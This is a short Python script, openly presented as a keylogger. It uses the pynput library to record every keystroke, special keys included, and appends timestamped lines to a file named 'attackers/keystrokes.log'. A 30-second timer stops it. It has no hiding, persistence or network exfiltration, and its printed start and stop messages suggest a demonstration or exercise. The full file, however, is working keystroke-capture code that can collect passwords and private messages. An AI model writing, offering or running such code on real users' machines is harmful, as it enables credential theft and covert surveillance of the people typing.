from pynput.keyboard import Listener, Key
from datetime import datetime
import threading

log_file = "attackers/keystrokes.log"
log_buffer = ""  # To collect characters until space/enter is pressed
stop_after_seconds = 30  # Auto-stop timer

print("Keylogger started! ⌨️")

def on_press(key):
    global log_buffer

    try:
        # Normal character keys
        log_buffer += key.char
    except AttributeError:
        # Special keys
        if key == Key.space:
            log_buffer += " "
            flush_log()
        elif key == Key.enter:
            log_buffer += "[ENTER]\n"
            flush_log()
        elif key == Key.backspace:
            log_buffer = log_buffer[:-1]
        else:
            # Capture special keys
            log_buffer += f"[{key.name.upper()}]"

def flush_log():
    global log_buffer
    if log_buffer.strip() == "":
        return

    time_stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        f.write(f"[{time_stamp}] {log_buffer}\n")
    log_buffer = ""  # clear after writing

def stop_listener():
    flush_log()  # write anything remaining before stop
    listener.stop()

listener = Listener(on_press=on_press)
listener.start()

timer = threading.Timer(stop_after_seconds, stop_listener)
timer.start()

listener.join()

print("Keylogger stopped! 🛑")
